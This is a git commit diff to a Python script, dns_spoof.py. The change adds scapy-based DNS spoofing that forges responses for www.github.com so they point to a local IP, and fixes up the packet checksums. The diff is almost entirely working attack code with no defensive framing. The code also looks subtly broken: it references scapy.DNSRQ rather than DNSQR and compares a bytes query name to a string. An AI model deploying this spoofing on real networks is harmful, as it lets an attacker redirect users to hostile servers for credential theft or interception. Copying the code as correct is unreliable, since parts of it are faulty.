eebe8bf66e43a73224210dda4942caad4e94a170
Vineeth B V <37930821+vinsdragonis@users.noreply.github.com>
2021-08-08 15:09:40 +0530

    Update dns_spoof.py

--- dns_spoof.py
+++ dns_spoof.py
@@ -6,7 +6,23 @@ import scapy.all as scapy
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    print(scapy_packet.show())
+    if scapy_packet.haslayer(scapy.DNSRR):
+        # print(scapy_packet.show())
+        
+        q_name = scapy_packet[scapy.DNSRQ].qname
+        if "www.github.com" in q_name:
+            print("[+] Spoofing target ")
+            answer = scapy.DNSRR(rrname=q_name, rdata="192.168.1.5")
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
+
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].len
+            del scapy_packet[scapy.UDP].chksum
+
+            packet.set_payload(str(scapy_packet))
+
     packet.accept()
 
 
